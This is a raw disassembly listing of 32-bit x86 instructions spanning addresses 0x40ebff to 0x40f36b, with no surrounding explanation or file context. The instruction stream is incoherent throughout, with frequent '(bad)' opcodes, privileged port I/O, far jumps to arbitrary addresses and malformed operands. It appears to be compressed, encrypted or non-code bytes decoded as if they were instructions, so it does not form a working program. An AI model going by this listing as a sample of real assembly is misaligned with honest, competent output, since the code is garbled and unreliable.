  40ebff:	rcl    BYTE PTR [eax-0x11],0xb0
  40ec03:	adc    al,0xe4
  40ec05:	and    DWORD PTR [edx-0x1a187a64],edi
  40ec0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec0c:	cmp    al,0x2e
  40ec0e:	out    dx,al
  40ec0f:	xor    al,BYTE PTR [ebp-0x7225f5ba]
  40ec15:	push   edx
  40ec16:	mov    bl,0x5f
  40ec18:	fsub   QWORD PTR [esi+0x1d64a383]
  40ec1e:	adc    DWORD PTR ss:[ebx+eax*8],ebp
  40ec22:	in     eax,dx
  40ec23:	bnd jl 0x40ec53
  40ec26:	aaa    
  40ec27:	retf   
  40ec28:	popa   
  40ec29:	dec    esi
  40ec2a:	mov    esi,0xccd9e447
  40ec2f:	scas   al,BYTE PTR es:[edi]
  40ec30:	add    DWORD PTR [edx],ebp
  40ec32:	mov    ds:0xc68b35c6,eax
  40ec37:	test   DWORD PTR [ecx-0x44c7af8d],edx
  40ec3d:	pop    esi
  40ec3e:	mov    ebp,0xa0abba66
  40ec43:	mov    bh,0x1c
  40ec45:	jmp    eax
  40ec47:	cmc    
  40ec48:	cs test al,0x47
  40ec4b:	jg     0x40ebdf
  40ec4d:	jnp    0x40ec30
  40ec4f:	pusha  
  40ec50:	cmp    eax,0x18d83f
  40ec55:	xor    ecx,ecx
  40ec57:	jo     0x40ebee
  40ec59:	mov    DWORD PTR [esi+edx*1],ebp
  40ec5c:	mov    ah,0xe6
  40ec5e:	inc    eax
  40ec5f:	xchg   ecx,eax
  40ec60:	and    eax,DWORD PTR [edx-0x46]
  40ec63:	inc    eax
  40ec64:	(bad)
  40ec67:	pusha  
  40ec68:	sbb    eax,edi
  40ec6a:	rcr    BYTE PTR [ebx],cl
  40ec6c:	mov    ebp,0x9f21b528
  40ec71:	dec    esi
  40ec72:	add    al,0x29
  40ec74:	je     0x40ec5d
  40ec76:	inc    ebx
  40ec77:	(bad)  
  40ec78:	or     al,0x1b
  40ec7a:	iret   
  40ec7b:	nop
  40ec7c:	mov    dl,0x34
  40ec7e:	sbb    ah,ah
  40ec80:	shl    DWORD PTR [eax+0x61],0xf3
  40ec84:	shr    DWORD PTR [ecx],0xe0
  40ec87:	dec    eax
  40ec88:	lods   al,BYTE PTR ds:[esi]
  40ec89:	cs imul edx,ebp,0x6e
  40ec8d:	out    dx,eax
  40ec8e:	fst    QWORD PTR [edi-0x6784c20b]
  40ec94:	cmp    ecx,edi
  40ec96:	(bad)  
  40ec97:	ds pop esi
  40ec99:	dec    ebx
  40ec9a:	jbe    0x40eca0
  40ec9c:	cmp    eax,0xf0313fb5
  40eca1:	pop    es
  40eca2:	in     eax,0x70
  40eca4:	fst    DWORD PTR [ebx]
  40eca6:	bound  ebx,QWORD PTR [edx+eax*2+0x48]
  40ecaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecab:	push   cs
  40ecac:	adc    edi,esp
  40ecae:	mov    ss:0x365ca80b,al
  40ecb4:	aad    0xd6
  40ecb6:	fist   WORD PTR [edx+0x4fdb939f]
  40ecbc:	add    al,0xc8
  40ecbe:	and    ch,al
  40ecc0:	mov    WORD PTR [edi+0x6bebb824],cs
  40ecc6:	adc    esp,DWORD PTR [ecx-0x1]
  40ecc9:	retf   
  40ecca:	in     eax,0xec
  40eccc:	adc    eax,0x5e8390f7
  40ecd1:	push   ebp
  40ecd2:	add    dl,dh
  40ecd4:	mov    BYTE PTR [edx+0x55b85ae],dh
  40ecda:	ins    DWORD PTR es:[edi],dx
  40ecdb:	xchg   ebp,eax
  40ecdc:	adc    al,al
  40ecde:	sbb    bh,BYTE PTR [ebx]
  40ece0:	hlt    
  40ece1:	mov    dl,dl
  40ece3:	mov    ah,0xb9
  40ece5:	jmp    FWORD PTR [esi-0x5d]
  40ece8:	into   
  40ece9:	xor    esp,DWORD PTR [eax]
  40eceb:	pushf  
  40ecec:	cdq    
  40eced:	cmp    bl,BYTE PTR [esi]
  40ecef:	popf   
  40ecf0:	and    al,bh
  40ecf2:	es inc edi
  40ecf4:	xor    al,0x74
  40ecf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecf7:	mov    ch,0x9f
  40ecf9:	mov    bl,0x62
  40ecfb:	jmp    0xaf56:0xdaa8f48
  40ed02:	push   0xffffffb5
  40ed04:	arpl   WORD PTR [edx+0x4fa700dd],si
  40ed0a:	push   esp
  40ed0b:	scas   eax,DWORD PTR es:[edi]
  40ed0c:	lock mov eax,ds:0x782a1946
  40ed12:	lock mov ebx,0x9e77172a
  40ed18:	or     al,BYTE PTR [ecx]
  40ed1a:	daa    
  40ed1b:	imul   ebx,DWORD PTR [edx],0x47fd61ab
  40ed21:	ja     0x40ece4
  40ed23:	(bad)  
  40ed24:	pop    ss
  40ed25:	test   BYTE PTR [edx-0x29b8e26a],0x1
  40ed2c:	out    0x18,eax
  40ed2e:	lods   eax,DWORD PTR ds:[esi]
  40ed2f:	je     0x40ed64
  40ed31:	mov    ebp,0x3840fc6
  40ed36:	ins    BYTE PTR es:[edi],dx
  40ed37:	pop    edi
  40ed38:	xchg   esi,eax
  40ed39:	das    
  40ed3a:	mov    ?,WORD PTR [ebp+0x63]
  40ed3d:	es push 0x51
  40ed40:	dec    edi
  40ed41:	xchg   esi,eax
  40ed42:	int    0x20
  40ed44:	push   esi
  40ed45:	scas   eax,DWORD PTR es:[edi]
  40ed46:	push   ss
  40ed47:	mov    BYTE PTR [ebx],bh
  40ed49:	(bad)  
  40ed4a:	scas   eax,DWORD PTR es:[edi]
  40ed4b:	jle    0x40edba
  40ed4d:	or     ecx,DWORD PTR [edi+0x25]
  40ed50:	cs shl ebp,1
  40ed53:	repz xchg esi,eax
  40ed55:	mov    bl,0xea
  40ed57:	sbb    dh,BYTE PTR [ebx-0x36aa662c]
  40ed5d:	lock sti 
  40ed5f:	mov    ebp,0x766b2d0b
  40ed64:	and    cl,bh
  40ed66:	mov    al,0x1f
  40ed68:	xor    DWORD PTR [ebx],ecx
  40ed6a:	add    eax,0xa43fd00e
  40ed6f:	add    eax,0xef54547c
  40ed74:	es xor ah,cl
  40ed77:	sar    BYTE PTR [ebx-0x6f698706],0xba
  40ed7e:	mov    ebp,0x8f9aa8fd
  40ed83:	adc    al,0x51
  40ed85:	fimul  DWORD PTR [ecx+0x5416fdd9]
  40ed8b:	push   esi
  40ed8c:	leave  
  40ed8d:	jae    0x40edf9
  40ed8f:	pop    ds
  40ed90:	push   edx
  40ed91:	push   0x44a054e
  40ed96:	stc    
  40ed97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed98:	cdq    
  40ed99:	jmp    0x40ed98
  40ed9b:	xchg   ecx,eax
  40ed9c:	mov    al,ds:0x7e47df7e
  40eda1:	pop    ebp
  40eda2:	cmp    eax,DWORD PTR [ecx-0x67]
  40eda5:	jb     0x40ed87
  40eda7:	fidivr WORD PTR cs:[ecx+ecx*2-0x7c]
  40edac:	mov    al,0x4a
  40edae:	cdq    
  40edaf:	sbb    al,0x84
  40edb1:	imul   edx,DWORD PTR [ebx+edx*2],0xffffffbf
  40edb5:	neg    BYTE PTR fs:[esi+0x38e62390]
  40edbc:	push   esi
  40edbd:	mov    dl,0xf6
  40edbf:	xor    DWORD PTR [eax+0x6b],ecx
  40edc2:	adc    ebp,DWORD PTR [eax]
  40edc4:	ins    BYTE PTR es:[edi],dx
  40edc5:	or     dh,BYTE PTR [edx-0x5e]
  40edc8:	or     al,0xa9
  40edca:	call   0x9069:0xa0aedbe4
  40edd1:	iret   
  40edd2:	adc    eax,0x2078d6
  40edd7:	mov    esp,0x56092570
  40eddc:	or     eax,0xb57e56e9
  40ede1:	sub    cl,BYTE PTR [edi+ebx*8+0x7f68ea7b]
  40ede8:	add    ecx,DWORD PTR [eax-0x2eaf3244]
  40edee:	add    bh,BYTE PTR [ebx]
  40edf0:	push   ds
  40edf1:	stos   DWORD PTR es:[edi],eax
  40edf2:	push   cs
  40edf3:	rep lods al,BYTE PTR ds:[esi]
  40edf5:	mov    ds:0x3ca251cb,al
  40edfa:	xor    eax,0xd730808f
  40edff:	inc    edx
  40ee00:	push   0x788244c3
  40ee05:	sbb    al,0x82
  40ee07:	(bad)  
  40ee08:	cwde   
  40ee09:	ficom  DWORD PTR [ebx+0x685e88a5]
  40ee0f:	push   eax
  40ee10:	add    eax,0x1c045f62
  40ee15:	fcomp  QWORD PTR [ebx-0x34]
  40ee18:	mov    ch,0x12
  40ee1a:	and    al,0x0
  40ee1c:	lods   eax,DWORD PTR ds:[esi]
  40ee1d:	fwait
  40ee1e:	sti    
  40ee1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee20:	es jmp 0x8191a52
  40ee26:	and    al,0x83
  40ee28:	inc    ecx
  40ee29:	retf   
  40ee2a:	xor    esp,DWORD PTR [ebx]
  40ee2c:	mov    BYTE PTR cs:[esi-0x7308eaff],bl
  40ee33:	fadd   st(6),st
  40ee35:	stos   BYTE PTR es:[edi],al
  40ee36:	loope  0x40ee8b
  40ee38:	sbb    BYTE PTR [eax+0x43799350],bh
  40ee3e:	add    al,0xbf
  40ee40:	pop    ebx
  40ee41:	sub    bh,dh
  40ee43:	enter  0x3933,0x47
  40ee47:	push   cs
  40ee48:	mov    ecx,0xf1f62d28
  40ee4d:	sti    
  40ee4e:	and    BYTE PTR [edx-0x5aff4bb3],ch
  40ee54:	hlt    
  40ee55:	pop    eax
  40ee56:	fidiv  WORD PTR [edi-0x1979e33]
  40ee5c:	mov    ebp,0x8c49af90
  40ee61:	in     al,dx
  40ee62:	leave  
  40ee63:	mov    WORD PTR [ebp+0x77],fs
  40ee66:	and    DWORD PTR [esi+ecx*2+0x71],ebp
  40ee6a:	and    al,0x7d
  40ee6c:	mov    al,0xad
  40ee6e:	sbb    ch,0xa7
  40ee71:	je     0x40ee9d
  40ee73:	jmp    0xdaff:0xc2bdeeba
  40ee7a:	push   ds
  40ee7b:	sahf   
  40ee7c:	(bad)  
  40ee7d:	or     DWORD PTR [ebx-0x58],eax
  40ee80:	add    eax,0xca3c62eb
  40ee85:	adc    BYTE PTR [ebp+0x7e],ah
  40ee88:	leave  
  40ee89:	sub    bh,BYTE PTR ds:0x44b24c62
  40ee8f:	jno    0x40ee56
  40ee91:	xor    DWORD PTR [edx-0x3c70f95],0xffffffc2
  40ee98:	sahf   
  40ee99:	inc    edx
  40ee9a:	call   0x6197c16
  40ee9f:	sub    eax,0x8c7aca06
  40eea4:	not    BYTE PTR [esi]
  40eea6:	shl    DWORD PTR [esi],0x32
  40eea9:	mov    dh,0x33
  40eeab:	or     ch,BYTE PTR [ecx-0x7cd14635]
  40eeb1:	push   esi
  40eeb2:	jmp    0xa42e:0x86f07289
  40eeb9:	push   es
  40eeba:	mov    edi,0x212398ee
  40eebf:	(bad)  
  40eec0:	jl     0x40ef0a
  40eec2:	rol    ebx,0x40
  40eec5:	adc    BYTE PTR [edx],0x56
  40eec8:	cmp    eax,edi
  40eeca:	outs   dx,DWORD PTR ds:[esi]
  40eecb:	retf   
  40eecc:	fld    TBYTE PTR [ebp+0x12e0c6cb]
  40eed2:	inc    ecx
  40eed3:	test   BYTE PTR [edx+0x63],0x72
  40eed7:	mov    es,ebp
  40eed9:	cmp    al,0x1b
  40eedb:	mov    eax,ds:0x8df252f0
  40eee0:	cdq    
  40eee1:	sub    eax,0xa526dfaa
  40eee6:	or     BYTE PTR [ebx],ch
  40eee8:	push   ecx
  40eee9:	dec    ebp
  40eeea:	and    ebp,DWORD PTR [eax]
  40eeec:	shr    BYTE PTR [ebp+esi*2+0x778bded0],1
  40eef3:	sbb    ebp,DWORD PTR [ebp+0x7302367e]
  40eef9:	ror    DWORD PTR [edi-0x72],1
  40eefc:	test   dl,al
  40eefe:	mov    ds:0x67024a47,al
  40ef03:	pop    edi
  40ef04:	clc    
  40ef05:	in     eax,dx
  40ef06:	or     al,0xe6
  40ef08:	shr    BYTE PTR [ebx*2+0x6175c88e],0x3b
  40ef10:	test   DWORD PTR [edx-0x4f623ead],0x327b59ee
  40ef1a:	test   al,0x76
  40ef1c:	add    ah,bl
  40ef1e:	js     0x40eeea
  40ef20:	mov    eax,0xddf87ef6
  40ef25:	aas    
  40ef26:	mov    ebx,0x2a380bf1
  40ef2b:	mov    bl,0xcb
  40ef2d:	adc    eax,0x62fadec6
  40ef32:	sti    
  40ef33:	add    bh,BYTE PTR [ebx+0x32]
  40ef36:	aam    0x5d
  40ef38:	xor    DWORD PTR [esi-0x3d5e9126],0xffffffd8
  40ef3f:	and    BYTE PTR [edi],dl
  40ef41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef42:	add    eax,0xa5be4d25
  40ef47:	fwait
  40ef48:	test   BYTE PTR [eax+0x6a],cl
  40ef4b:	or     al,0x94
  40ef4d:	adc    esi,0xc6399260
  40ef53:	xchg   edx,eax
  40ef54:	sbb    esi,eax
  40ef56:	scas   al,BYTE PTR es:[edi]
  40ef57:	sbb    ebx,DWORD PTR [ecx]
  40ef59:	fdivr  DWORD PTR ds:0xfc20cc16
  40ef5f:	fwait
  40ef60:	ror    eax,1
  40ef62:	pushf  
  40ef63:	clc    
  40ef64:	mov    ebx,0x33c0a45b
  40ef69:	je     0x40efd9
  40ef6b:	hlt    
  40ef6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef6d:	enter  0xce43,0x6a
  40ef71:	dec    ecx
  40ef72:	cmp    al,0xa6
  40ef74:	int    0xdf
  40ef76:	add    eax,0x988e335
  40ef7b:	lea    esi,[ebx+edi*4]
  40ef7e:	push   ecx
  40ef7f:	js     0x40efee
  40ef81:	or     ecx,DWORD PTR [edi-0x3ccbd450]
  40ef87:	clc    
  40ef88:	dec    ebx
  40ef89:	jmp    0x7b7222e6
  40ef8e:	inc    ebp
  40ef8f:	inc    esp
  40ef90:	enter  0x47c4,0x53
  40ef94:	or     BYTE PTR [ebp-0x4b],ah
  40ef97:	data16 icebp 
  40ef99:	adc    dh,0xef
  40ef9c:	pop    edx
  40ef9d:	jns    0x40ef4f
  40ef9f:	pop    ebx
  40efa1:	popf   
  40efa2:	ins    BYTE PTR es:[edi],dx
  40efa3:	(bad)  
  40efa5:	lods   eax,DWORD PTR ds:[esi]
  40efa6:	mov    ebp,0x1bf1f70a
  40efab:	mov    ebx,DWORD PTR [ecx-0x80]
  40efae:	test   eax,0xe890a7e3
  40efb3:	repnz data16 outs dx,BYTE PTR ds:[esi]
  40efb6:	es nop
  40efb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efb9:	nop
  40efba:	pop    ds
  40efbb:	retf   
  40efbc:	adc    ebp,DWORD PTR [ebx]
  40efbe:	bsr    ebp,DWORD PTR [ecx]
  40efc1:	dec    eax
  40efc2:	inc    edi
  40efc3:	and    cl,BYTE PTR [ecx+0x5d]
  40efc6:	fisttp WORD PTR [edi]
  40efc8:	shl    DWORD PTR [edx+0x2e],0xb7
  40efcc:	push   esi
  40efcd:	push   ecx
  40efce:	je     0x40ef94
  40efd0:	into   
  40efd1:	aas    
  40efd2:	sub    ch,BYTE PTR [esi-0x16]
  40efd5:	repnz sub edi,DWORD PTR [edi-0x26]
  40efd9:	aaa    
  40efda:	sub    eax,esp
  40efdc:	sub    ch,BYTE PTR [ebx+0x1d]
  40efdf:	int    0x74
  40efe1:	add    ebx,DWORD PTR [ebp+0x2c]
  40efe4:	les    esp,FWORD PTR [ebx]
  40efe6:	pop    esi
  40efe7:	fnstsw WORD PTR [ebp-0x59ab011a]
  40efed:	enter  0xfc7f,0xd1
  40eff1:	enter  0x88bf,0xd7
  40eff5:	and    ah,BYTE PTR [ebx]
  40eff7:	xchg   esi,eax
  40eff8:	push   eax
  40eff9:	pushf  
  40effa:	push   edi
  40effb:	mov    al,ds:0x5e403136
  40f000:	and    eax,DWORD PTR [edx+eax*2-0x12]
  40f004:	mov    bh,0x73
  40f006:	dec    cl
  40f008:	mov    cl,0xd4
  40f00a:	xlat   BYTE PTR ds:[ebx]
  40f00b:	and    BYTE PTR [edi-0x65ca85e],bl
  40f011:	fiadd  WORD PTR [esi+0x67949d53]
  40f017:	push   ebp
  40f018:	daa    
  40f019:	mov    dl,BYTE PTR [ecx+0x3b]
  40f01c:	mov    WORD PTR [eax-0x3c],es
  40f01f:	inc    esi
  40f020:	jae    0x40efef
  40f022:	or     eax,0x28e2e97
  40f027:	imul   DWORD PTR [esi-0xc8375ca]
  40f02d:	dec    edi
  40f02e:	sbb    eax,edi
  40f030:	and    al,0xe5
  40f032:	add    DWORD PTR [ebx-0x77],edx
  40f035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f036:	out    0xb5,al
  40f038:	jo     0x40f009
  40f03a:	loope  0x40efc8
  40f03c:	mov    DWORD PTR [ecx],ecx
  40f03e:	or     dl,BYTE PTR [ebx]
  40f040:	or     DWORD PTR [esi+0xe],esp
  40f043:	lock in eax,dx
  40f045:	mov    esi,0x4d12a83d
  40f04a:	dec    esi
  40f04b:	loop   0x40f054
  40f04d:	cwde   
  40f04e:	ins    BYTE PTR es:[edi],dx
  40f04f:	in     al,0xa2
  40f051:	push   cs
  40f052:	shr    DWORD PTR [edi],cl
  40f054:	int    0x6d
  40f056:	pusha  
  40f057:	jmp    0xa5b06b0
  40f05c:	push   0xffffffb5
  40f05e:	lods   eax,DWORD PTR ds:[esi]
  40f05f:	bound  ebx,QWORD PTR [edx+0x6c]
  40f062:	pop    esp
  40f063:	jns    0x40f017
  40f065:	mov    ecx,0xb172c651
  40f06a:	dec    esi
  40f06b:	(bad)  
  40f06c:	add    eax,0x3346097
  40f071:	sar    BYTE PTR [esi+0x2d],1
  40f074:	iret   
  40f075:	inc    eax
  40f076:	xchg   ebp,eax
  40f077:	push   cs
  40f078:	scas   al,BYTE PTR es:[edi]
  40f079:	or     DWORD PTR [edx],edi
  40f07b:	mov    ebx,0x52518ab0
  40f080:	xor    bl,BYTE PTR [ebx+ecx*8+0x49]
  40f084:	(bad)  
  40f085:	adc    al,0xae
  40f087:	push   esp
  40f088:	sar    DWORD PTR [edi-0x1e],1
  40f08b:	jmp    DWORD PTR [ecx+0x6ee316e8]
  40f091:	mov    ecx,0x486dde67
  40f096:	jae    0x40f083
  40f098:	add    ebp,eax
  40f09a:	nop
  40f09b:	stc    
  40f09c:	dec    eax
  40f09d:	out    0x8c,al
  40f09f:	dec    edi
  40f0a0:	hlt    
  40f0a1:	stc    
  40f0a2:	out    dx,eax
  40f0a3:	cmp    edx,DWORD PTR [esi-0x3ac71844]
  40f0a9:	aaa    
  40f0aa:	push   cs
  40f0ab:	dec    ebp
  40f0ac:	in     al,0xaf
  40f0ae:	pop    ebp
  40f0af:	scas   al,BYTE PTR es:[edi]
  40f0b0:	adc    esi,DWORD PTR [edx]
  40f0b2:	(bad)  
  40f0b3:	pushf  
  40f0b4:	add    BYTE PTR [esi],al
  40f0b6:	xchg   DWORD PTR fs:[edi+ebx*8+0x350db4ea],eax
  40f0be:	xor    eax,DWORD PTR ds:0x2eede9a9
  40f0c4:	inc    eax
  40f0c5:	or     dh,al
  40f0c7:	out    dx,eax
  40f0c8:	mov    WORD PTR [edi],fs
  40f0ca:	loop   0x40f130
  40f0cc:	paddq  mm0,QWORD PTR [ebx+0x1e804cfb]
  40f0d3:	dec    eax
  40f0d4:	imul   ebp,DWORD PTR [eax],0x44e576b8
  40f0da:	xchg   esi,eax
  40f0db:	arpl   sp,dx
  40f0dd:	psrlq  mm4,QWORD PTR [edi]
  40f0e0:	mov    ch,0x57
  40f0e2:	inc    edi
  40f0e3:	xor    BYTE PTR [edx],bl
  40f0e5:	inc    ebp
  40f0e6:	inc    edi
  40f0e7:	rol    BYTE PTR [ecx],cl
  40f0e9:	push   0xe92fc224
  40f0ee:	stc    
  40f0ef:	inc    ebx
  40f0f0:	jge    0x40f14e
  40f0f2:	rcr    BYTE PTR [ebx],1
  40f0f4:	mov    ch,0x1a
  40f0f6:	pop    ss
  40f0f7:	pop    esp
  40f0f8:	inc    eax
  40f0f9:	cdq    
  40f0fa:	cld    
  40f0fb:	cs sub edx,0x51
  40f0ff:	shl    DWORD PTR [esi+0x10],1
  40f102:	pop    ss
  40f103:	fcomp  DWORD PTR [esi+ebx*1+0x455c9b78]
  40f10a:	ins    DWORD PTR es:[edi],dx
  40f10b:	cmp    eax,0x7940972e
  40f110:	mov    ds:0x52d5bfb3,al
  40f115:	js     0x40f137
  40f117:	xor    al,0x80
  40f119:	mov    dl,0xe0
  40f11b:	mov    ebp,0x856819ac
  40f120:	(bad)  
  40f121:	loop   0x40f15f
  40f123:	jne    0x40f123
  40f125:	dec    ebp
  40f126:	sahf   
  40f127:	sub    esi,DWORD PTR [eax]
  40f129:	mov    bh,0x29
  40f12b:	jle    0x40f16b
  40f12d:	(bad)  
  40f12e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f12f:	cli    
  40f130:	xor    dl,BYTE PTR [ecx]
  40f132:	jg     0x40f123
  40f134:	fdivr  QWORD PTR [ebp+0x2a15cfc]
  40f13a:	mov    esp,0xc19c3780
  40f13f:	in     al,dx
  40f140:	dec    ecx
  40f141:	sub    DWORD PTR ds:0x8f6497ac,ebp
  40f147:	mov    BYTE PTR [ebx-0x66],dh
  40f14a:	add    DWORD PTR [eax+0x1d81c9b4],ebp
  40f150:	ja     0x40f162
  40f152:	pop    eax
  40f153:	retf   
  40f154:	add    al,0x99
  40f156:	sbb    eax,0x871ea147
  40f15b:	xor    esp,DWORD PTR [edi+0x2fca2835]
  40f161:	test   eax,0x211e1da8
  40f166:	pop    edi
  40f167:	pop    ecx
  40f168:	clc    
  40f169:	pop    eax
  40f16a:	inc    edx
  40f16b:	xor    dh,BYTE PTR [ecx-0x7c6b27ec]
  40f171:	mov    bl,0x86
  40f173:	or     eax,0xb99a709f
  40f178:	xchg   esp,eax
  40f179:	ror    DWORD PTR [ebx-0x51fdac99],0x5d
  40f180:	jle    0x40f107
  40f182:	stos   DWORD PTR es:[edi],eax
  40f183:	jnp    0x40f162
  40f185:	call   0xc08:0x19f233af
  40f18c:	repz test BYTE PTR [ecx+0x26406836],ah
  40f193:	sub    al,0x8e
  40f195:	push   esi
  40f196:	push   ecx
  40f197:	jb     0x40f129
  40f199:	out    0xe2,eax
  40f19b:	fwait
  40f19c:	cmp    eax,0xdea8bc65
  40f1a1:	das    
  40f1a2:	and    bh,bh
  40f1a4:	jne    0x40f204
  40f1a6:	out    dx,eax
  40f1a7:	retf   
  40f1a8:	int3   
  40f1a9:	or     DWORD PTR [ebx+esi*8-0x36584466],eax
  40f1b0:	pop    edi
  40f1b1:	sbb    BYTE PTR [esi+0x68],dl
  40f1b4:	(bad)  
  40f1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1b7:	je     0x40f163
  40f1b9:	popa   
  40f1ba:	mov    ebp,0x24cb7add
  40f1bf:	and    eax,0x36a4076f
  40f1c4:	mov    al,0xd0
  40f1c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1c7:	mov    dl,0xc5
  40f1c9:	and    BYTE PTR [ebx+0x53],0xae
  40f1cd:	out    dx,eax
  40f1ce:	fcomp  DWORD PTR [esi-0x28609637]
  40f1d4:	add    BYTE PTR [eax],bl
  40f1d6:	xlat   BYTE PTR ds:[ebx]
  40f1d7:	int3   
  40f1d8:	pop    esp
  40f1d9:	(bad)  
  40f1da:	or     BYTE PTR [ebx-0x3b0a7630],al
  40f1e0:	call   0x9477:0x11d602ef
  40f1e7:	or     DWORD PTR [ebx],edx
  40f1e9:	sbb    DWORD PTR [ecx-0x33],esi
  40f1ec:	leave  
  40f1ed:	push   ecx
  40f1ee:	cld    
  40f1ef:	sbb    DWORD PTR [esi],0x9a66a9de
  40f1f5:	push   ebx
  40f1f6:	and    DWORD PTR [edx+eiz*8+0x35],ecx
  40f1fa:	arpl   WORD PTR [edx+0x60],dx
  40f1fd:	mov    edx,DWORD PTR [edi]
  40f1ff:	inc    ebp
  40f200:	test   eax,0x71d3f00c
  40f205:	(bad)  
  40f207:	mov    dl,BYTE PTR [ebx-0x1d0b47d6]
  40f20d:	cmp    DWORD PTR [esi-0x74],ebp
  40f210:	mul    eax
  40f212:	scas   eax,DWORD PTR es:[edi]
  40f213:	xlat   BYTE PTR ds:[ebx]
  40f214:	cmp    BYTE PTR [edi+eax*2],0x6b
  40f218:	fnstsw WORD PTR [ecx]
  40f21a:	retf   
  40f21b:	popf   
  40f21c:	inc    esi
  40f21d:	xchg   DWORD PTR [esi+0x3937753a],edi
  40f223:	loopne 0x40f227
  40f225:	mov    edx,0x8eaba94f
  40f22a:	outs   dx,DWORD PTR ds:[esi]
  40f22b:	data16 cld 
  40f22d:	push   cs
  40f22e:	inc    ebp
  40f22f:	and    ecx,0x66eab061
  40f235:	std    
  40f236:	sti    
  40f237:	and    sp,WORD PTR [edi-0x204e0b5]
  40f23e:	aad    0x53
  40f240:	sbb    DWORD PTR [esi+0x37614094],ebp
  40f246:	xchg   BYTE PTR [eax],bl
  40f248:	stos   DWORD PTR es:[edi],eax
  40f249:	outs   dx,DWORD PTR ds:[esi]
  40f24a:	sub    edx,edx
  40f24c:	not    WORD PTR [edx-0x462cb9c1]
  40f253:	mov    bh,0x2a
  40f255:	aas    
  40f256:	mov    al,ds:0xc2e942fc
  40f25b:	mov    bl,0x4
  40f25d:	out    dx,eax
  40f25e:	mov    edi,DWORD PTR [edx-0x5e]
  40f261:	stos   BYTE PTR es:[edi],al
  40f262:	pop    ss
  40f263:	ds icebp 
  40f265:	ret    0x2218
  40f268:	leave  
  40f269:	inc    ebp
  40f26a:	add    DWORD PTR [edi+0x50],ebp
  40f26d:	inc    ebx
  40f26e:	cmp    DWORD PTR [edi+0x2f],esp
  40f271:	pop    es
  40f272:	pushf  
  40f273:	imul   eax,DWORD PTR [eax-0x133182fa],0x85dbc6e5
  40f27d:	cmp    ecx,ebx
  40f27f:	sti    
  40f280:	jmp    0x9a98:0xdf0fc48f
  40f287:	lock repnz inc ecx
  40f28a:	int3   
  40f28b:	cmp    dl,BYTE PTR [edx-0x1]
  40f28e:	mov    ds:0xdd75b9d5,eax
  40f293:	push   0x24
  40f295:	pushf  
  40f296:	push   cs
  40f297:	push   0x381db8ab
  40f29c:	and    ecx,DWORD PTR [ebx-0x5b]
  40f29f:	or     DWORD PTR [esi],eax
  40f2a1:	push   es
  40f2a2:	pusha  
  40f2a3:	mov    ds:0x325e840e,eax
  40f2a8:	cmp    al,BYTE PTR [ecx+edx*1+0x30]
  40f2ac:	test   al,0x12
  40f2ae:	inc    esp
  40f2af:	inc    esi
  40f2b0:	int    0xc4
  40f2b2:	push   esp
  40f2b3:	cs ss adc edx,edi
  40f2b7:	cli    
  40f2b8:	into   
  40f2b9:	clc    
  40f2ba:	mov    eax,0xef74f1d6
  40f2bf:	hlt    
  40f2c0:	mov    eax,0x8865bc8
  40f2c5:	dec    edx
  40f2c6:	pop    ebp
  40f2c7:	lods   al,BYTE PTR ds:[esi]
  40f2c8:	mov    edi,gs
  40f2ca:	adc    al,0xb0
  40f2cc:	dec    edx
  40f2cd:	rcr    al,cl
  40f2cf:	dec    ecx
  40f2d0:	xor    al,0xc5
  40f2d2:	mov    esp,0x19491f8a
  40f2d7:	stos   DWORD PTR es:[edi],eax
  40f2d8:	cwde   
  40f2d9:	lods   eax,DWORD PTR ds:[esi]
  40f2da:	adc    DWORD PTR [eax],0xe1c1349b
  40f2e0:	ror    cl,1
  40f2e2:	mov    bl,0x79
  40f2e4:	jg     0x40f360
  40f2e6:	icebp  
  40f2e7:	pop    ebx
  40f2e8:	cmc    
  40f2e9:	dec    edx
  40f2ea:	pop    edx
  40f2eb:	fisttp WORD PTR [edx-0x372dab83]
  40f2f1:	add    DWORD PTR [esi+0x3c],edx
  40f2f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2f5:	int3   
  40f2f6:	adc    ecx,esi
  40f2f8:	sbb    eax,0x6d4833fd
  40f2fd:	ds mov ecx,0xfef05058
  40f304:	lahf   
  40f305:	mov    edx,0x197c99a
  40f30a:	adc    eax,0x45eaf76d
  40f30f:	push   edi
  40f310:	jle    0x40f37d
  40f312:	out    0x90,al
  40f314:	sub    DWORD PTR [ecx+eax*1],edx
  40f317:	xchg   ebx,eax
  40f318:	push   cs
  40f319:	xchg   edx,eax
  40f31a:	add    eax,0x34cc0f53
  40f31f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f320:	mov    ?,WORD PTR [esi-0x52198056]
  40f326:	add    eax,0x1e8ea60e
  40f32b:	stc    
  40f32c:	push   ebp
  40f32d:	ss aam 0xdf
  40f330:	imul   ch
  40f332:	inc    edi
  40f333:	adc    bh,BYTE PTR [ecx]
  40f335:	adc    al,0x94
  40f337:	mov    ch,0x96
  40f339:	mov    al,ds:0x305ea324
  40f33e:	jmp    0x8397:0x1a098097
  40f345:	xchg   DWORD PTR [ecx+edi*1],esp
  40f348:	or     al,0xec
  40f34a:	jge    0x40f355
  40f34c:	mov    cl,BYTE PTR [esi]
  40f34e:	sar    BYTE PTR [eax+0x2f],1
  40f351:	adc    eax,0xaf049936
  40f356:	dec    ebx
  40f357:	push   cs
  40f358:	jge    0x40f31e
  40f35a:	inc    ebx
  40f35b:	int3   
  40f35c:	stc    
  40f35d:	xchg   ebp,eax
  40f35e:	int3   
  40f35f:	daa    
  40f360:	loope  0x40f303
  40f362:	push   ebp
  40f363:	push   cs
  40f364:	jg     0x40f38c
  40f366:	es sti 
  40f368:	push   ebp
  40f369:	mov    ah,0xe6
  40f36b:	pop    ebx
